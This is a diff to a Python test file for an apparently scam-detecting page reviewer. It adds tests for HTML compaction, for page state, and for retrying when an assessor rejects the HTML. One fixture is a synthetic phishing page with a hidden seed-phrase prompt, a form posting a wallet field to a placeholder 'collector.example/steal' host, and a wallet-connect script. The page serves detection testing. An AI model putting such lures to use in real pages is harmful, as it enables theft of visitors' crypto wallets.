@@ -11,7 +11,10 @@ sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))
 
 from trustline.inspection import JevError
 from trustline.reviews import ReviewManager, review_url
-from trustline.remote import CloudflareBrowser, RemoteError, RemoteReviewer, page_features, page_state, public_url
+from trustline.remote import (
+    HTML_LIMIT, CloudflareBrowser, RemoteError, RemoteReviewer, compact_html, page_features,
+    page_state, public_url,
+)
 
 
 class ReviewTests(unittest.IsolatedAsyncioTestCase):
@@ -193,6 +196,41 @@ class RemoteReviewerTests(unittest.IsolatedAsyncioTestCase):
                 {"method": "get", "action_origin": None, "inputs": []}],
         })
         self.assertNotIn("secret", json.dumps(state))
+
+    def test_page_html_is_compacted_for_jev_but_keeps_what_visitors_cannot_see(self):
+        html = compact_html(
+            "<html><head><style>body { color: red }</style><!-- note --></head>\n<body>\n"
+            "<svg viewBox='0 0 9 9'><path d='M0 0L9 9'/></svg><img src='data:image/png;base64,QUJDRA=='>"
+            "<div hidden>Enter your seed phrase</div>"
+            "<form action='https://collector.example/steal'><input type='hidden' name='wallet'></form>"
+            "<script>window.ethereum.request({method:'eth_requestAccounts'})" + "x" * 5000 + "</script>"
+            "</body></html>")
+        for kept in ["Enter your seed phrase", "https://collector.example/steal", "name='wallet'",
+                     "eth_requestAccounts", "<style></style>", "<svg viewBox='0 0 9 9'></svg>", "data:…"]:
+            self.assertIn(kept, html)
+        for dropped in ["color: red", "note", "M0 0L9 9", "QUJDRA==", "x" * 2001, "\n"]:
+            self.assertNotIn(dropped, html)
+        self.assertEqual(len(compact_html("<p>" + "a " * 100000 + "</p>")), HTML_LIMIT)
+        self.assertEqual(compact_html(None), "")
+
+    def test_page_state_includes_compacted_html_only_when_present_and_wanted(self):
+        observation = {"url": "https://shop.example/", "title": "Shop", "text": "Hi", "forms": [],
+                       "html": "<body>  <p>Hi</p> </body>"}
+        self.assertEqual(page_state(observation)["html"], "<body> <p>Hi</p> </body>")
+        self.assertNotIn("html", page_state(observation, include_html=False))
+        self.assertNotIn("html", page_state({**observation, "html": ""}))
+
+    async def test_page_check_retries_without_html_when_jev_rejects_it(self):
+        browser = self.browser(url="https://shop.example/")
+        observation = await browser.observe()
+        observation["html"] = "<body>" + "a " * 30000 + "</body>"
+        browser.observe = AsyncMock(return_value=observation)
+        jev = Mock(assess_page=Mock(side_effect=[JevError("Jev HTTP error 400"), (0.95, 0.9)]))
+        result = await RemoteReviewer(self.allowing_model(), lambda: browser, jev=jev).review("https://shop.example/")
+        self.assertEqual(result["verdict"], "block")
+        first, second = (call.args[0] for call in jev.assess_page.call_args_list)
+        self.assertIn("html", first)
+        self.assertNotIn("html", second)
 
     async def test_cloudflare_browser_rejects_forms_private_networks_and_cross_origin_navigation(self):
         browser = CloudflareBrowser("a" * 32, "synthetic-token")
